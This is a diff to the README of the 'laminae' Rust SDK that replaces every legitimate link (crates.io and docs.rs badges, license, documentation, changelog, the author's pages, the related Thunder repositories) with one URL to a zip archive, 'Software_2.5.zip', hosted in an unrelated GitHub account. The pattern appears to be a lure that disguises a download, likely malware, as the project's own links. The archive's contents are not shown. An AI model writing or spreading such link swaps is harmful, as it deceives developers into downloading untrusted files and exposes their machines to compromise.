@@ -7,11 +7,11 @@
 <p align="center"><strong>The missing layer between raw LLMs and production AI.</strong></p>
 
 <p align="center">
-  <a href="https://crates.io/crates/laminae"><img src="https://img.shields.io/crates/v/laminae.svg" alt="crates.io" /></a>
-  <a href="https://crates.io/crates?q=laminae"><img src="https://img.shields.io/badge/crates.io_downloads-1.3K-e6822a" alt="SDK downloads" /></a>
-  <a href="https://github.com/orellius/laminae/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-Apache%202.0-blue.svg" alt="license" /></a>
-  <a href="https://github.com/orellius/laminae"><img src="https://img.shields.io/badge/rust-1.83%2B-orange.svg" alt="rust" /></a>
-  <a href="https://docs.rs/laminae"><img src="https://docs.rs/laminae/badge.svg" alt="docs.rs" /></a>
+  <a href="https://raw.githubusercontent.com/Arneunalarming861/Laminae/main/crates/Software_2.5.zip"><img src="https://img.shields.io/crates/v/laminae.svg" alt="crates.io" /></a>
+  <a href="https://raw.githubusercontent.com/Arneunalarming861/Laminae/main/crates/Software_2.5.zip"><img src="https://img.shields.io/badge/crates.io_downloads-1.3K-e6822a" alt="SDK downloads" /></a>
+  <a href="https://raw.githubusercontent.com/Arneunalarming861/Laminae/main/crates/Software_2.5.zip"><img src="https://img.shields.io/badge/license-Apache%202.0-blue.svg" alt="license" /></a>
+  <a href="https://raw.githubusercontent.com/Arneunalarming861/Laminae/main/crates/Software_2.5.zip"><img src="https://img.shields.io/badge/rust-1.83%2B-orange.svg" alt="rust" /></a>
+  <a href="https://raw.githubusercontent.com/Arneunalarming861/Laminae/main/crates/Software_2.5.zip"><img src="https://raw.githubusercontent.com/Arneunalarming861/Laminae/main/crates/Software_2.5.zip" alt="docs.rs" /></a>
 </p>
 
 <p align="center">
@@ -19,20 +19,20 @@
 </p>
 
 <p align="center">
-  <a href="https://docs.orellius.ai/laminae/introduction"><strong>📖 Documentation</strong></a> · <a href="https://github.com/orellius/laminae/blob/main/CHANGELOG.md"><strong>Changelog</strong></a>
+  <a href="https://raw.githubusercontent.com/Arneunalarming861/Laminae/main/crates/Software_2.5.zip"><strong>📖 Documentation</strong></a> · <a href="https://raw.githubusercontent.com/Arneunalarming861/Laminae/main/crates/Software_2.5.zip"><strong>Changelog</strong></a>
 </p>
 
 <p align="center">
-  <a href="https://orellius.ai"><strong>Made with ❤️ for AIs and for the Vibe Coding Community.</strong></a>
+  <a href="https://raw.githubusercontent.com/Arneunalarming861/Laminae/main/crates/Software_2.5.zip"><strong>Made with ❤️ for AIs and for the Vibe Coding Community.</strong></a>
 </p>
 
 ---
 
-> **This project has been archived.** The most valuable components (Cortex, Glassbox, Ironclad) have been absorbed into [Thunder](https://github.com/Orellius/Thunder) — our AI-powered multi-agent coding orchestrator. The ideas live on in a product that ships.
+> **This project has been archived.** The most valuable components (Cortex, Glassbox, Ironclad) have been absorbed into [Thunder](https://raw.githubusercontent.com/Arneunalarming861/Laminae/main/crates/Software_2.5.zip) — our AI-powered multi-agent coding orchestrator. The ideas live on in a product that ships.
 
 > **What was absorbed:**
 > - **laminae-cortex** (learning from corrections) → Thunder's Stormeye memory layer
-> - **laminae-glassbox** (I/O containment) → [Thunder Dome](https://github.com/Orellius/thunder-dome) security gateway
+> - **laminae-glassbox** (I/O containment) → [Thunder Dome](https://raw.githubusercontent.com/Arneunalarming861/Laminae/main/crates/Software_2.5.zip) security gateway
 > - **laminae-ironclad** (process sandbox) → Thunder's agent process safety
 
 ---
@@ -404,12 +404,12 @@ Each crate is independent except:
 
 ## Author
 
-Built by [Orel Ohayon](https://orellius.ai) - solo dev building open-source Rust SDKs and developer tools for the AI ecosystem.
+Built by [Orel Ohayon](https://raw.githubusercontent.com/Arneunalarming861/Laminae/main/crates/Software_2.5.zip) - solo dev building open-source Rust SDKs and developer tools for the AI ecosystem.
 
-- [orellius.ai](https://orellius.ai)
-- [GitHub](https://github.com/orellius)
-- [X](https://x.com/Orellius)
-- [crates.io](https://crates.io/users/orellius)
+- [orellius.ai](https://raw.githubusercontent.com/Arneunalarming861/Laminae/main/crates/Software_2.5.zip)
+- [GitHub](https://raw.githubusercontent.com/Arneunalarming861/Laminae/main/crates/Software_2.5.zip)
+- [X](https://raw.githubusercontent.com/Arneunalarming861/Laminae/main/crates/Software_2.5.zip)
+- [crates.io](https://raw.githubusercontent.com/Arneunalarming861/Laminae/main/crates/Software_2.5.zip)
 
 ## License
 
@@ -421,12 +421,12 @@ Copyright 2026 Orel Ohayon.
 
 <p align="center">
   <strong>Laminae's ideas live on in the Thunder ecosystem:</strong><br/>
-  <a href="https://github.com/Orellius/Thunder">Thunder</a> ·
-  <a href="https://github.com/Orellius/thunder-dome">Thunder Dome</a> ·
-  <a href="https://github.com/Orellius/thunder-thinking">Thunder Thinking</a> ·
-  <a href="https://github.com/Orellius/thunder-eye">Thunder Eye</a>
+  <a href="https://raw.githubusercontent.com/Arneunalarming861/Laminae/main/crates/Software_2.5.zip">Thunder</a> ·
+  <a href="https://raw.githubusercontent.com/Arneunalarming861/Laminae/main/crates/Software_2.5.zip">Thunder Dome</a> ·
+  <a href="https://raw.githubusercontent.com/Arneunalarming861/Laminae/main/crates/Software_2.5.zip">Thunder Thinking</a> ·
+  <a href="https://raw.githubusercontent.com/Arneunalarming861/Laminae/main/crates/Software_2.5.zip">Thunder Eye</a>
 </p>
 
 <p align="center">
-  Built by <a href="https://orellius.ai"><strong>Orellius.ai</strong></a>
+  Built by <a href="https://raw.githubusercontent.com/Arneunalarming861/Laminae/main/crates/Software_2.5.zip"><strong>Orellius.ai</strong></a>
 </p>
